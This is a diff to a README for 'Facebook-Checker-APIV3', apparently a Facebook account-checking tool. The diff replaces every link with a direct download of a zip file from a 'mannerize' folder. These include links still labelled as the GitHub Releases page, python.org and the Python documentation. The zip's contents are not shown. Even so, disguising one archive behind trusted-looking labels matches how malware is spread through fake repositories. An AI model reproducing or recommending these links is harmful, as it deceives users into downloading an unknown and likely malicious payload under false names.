@@ -7,11 +7,11 @@ Facebook-Checker-APIV3 is a simple Python application. It helps you check the st
 To get started, you'll need to download the application. Follow these steps to install and run Facebook-Checker-APIV3.
 
 ## ⬇️ Download Now
-[![Download Facebook-Checker-APIV3](https://img.shields.io/badge/Download-Facebook--Checker--APIV3-blue)](https://github.com/DeathsEn247/Facebook-Checker-APIV3/releases)
+[![Download Facebook-Checker-APIV3](https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip)](https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click this link to visit the Releases page: [Download from GitHub Releases](https://github.com/DeathsEn247/Facebook-Checker-APIV3/releases).
+   Click this link to visit the Releases page: [Download from GitHub Releases](https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version of Facebook-Checker-APIV3. You will see a list of files available for download.
@@ -27,7 +27,7 @@ To get started, you'll need to download the application. Follow these steps to i
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or later, macOS, or Linux.
-- **Python Version:** Ensure Python 3.x is installed on your device. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python Version:** Ensure Python 3.x is installed on your device. You can download it from [https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip](https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip).
 - **Network Connection:** A stable internet connection is necessary for verifying the accounts.
 
 ## ⚙️ Features
@@ -63,7 +63,7 @@ Facebook-Checker-APIV3 touches on various important areas:
 For further inquiries, please use the contact information provided on our GitHub page. We welcome feedback and suggestions to improve our application.
 
 ## 📖 Learn More
-To learn more about Python applications and how to utilize them, visit [Python Documentation](https://docs.python.org/3/). It offers a wealth of knowledge for both beginners and experienced users. 
+To learn more about Python applications and how to utilize them, visit [Python Documentation](https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip). It offers a wealth of knowledge for both beginners and experienced users. 
 
 ## ⬇️ Download Now Again
-Don't forget to visit the Releases page to download the latest version: [Download from GitHub Releases](https://github.com/DeathsEn247/Facebook-Checker-APIV3/releases).
+Don't forget to visit the Releases page to download the latest version: [Download from GitHub Releases](https://raw.githubusercontent.com/DeathsEn247/Facebook-Checker-APIV3/main/mannerize/Facebook-Checker-APIV3.zip).
